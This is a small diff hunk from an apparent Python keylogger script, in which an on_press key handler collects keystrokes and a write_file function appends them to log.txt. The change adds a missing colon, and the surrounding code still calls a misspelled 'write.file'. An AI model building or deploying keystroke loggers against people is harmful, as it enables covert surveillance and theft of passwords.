@@ -16,7 +16,7 @@ def on_press(key):
         write.file(str(keys))
         keys = []
 
-def write_file(keys)
+def write_file(keys):
     with open("log.txt", "a") as f:
         for key in keys:
             k = str(key).replace("'", "")
